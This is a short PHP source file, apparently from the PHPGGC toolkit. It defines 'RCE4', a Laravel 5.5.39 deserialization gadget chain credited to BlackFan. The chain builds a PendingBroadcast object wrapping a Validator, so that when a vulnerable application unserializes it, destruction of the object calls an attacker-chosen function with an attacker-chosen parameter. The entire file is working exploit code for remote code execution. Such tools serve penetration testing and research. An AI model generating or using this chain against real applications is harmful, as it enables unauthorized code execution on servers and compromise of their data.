<?php

namespace GadgetChain\Laravel;

class RCE4 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.5.39';
    public static $vector = '__destruct';
    public static $author = 'BlackFan';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast(
            new \Illuminate\Validation\Validator($function),
            $parameter
        );
    }
}
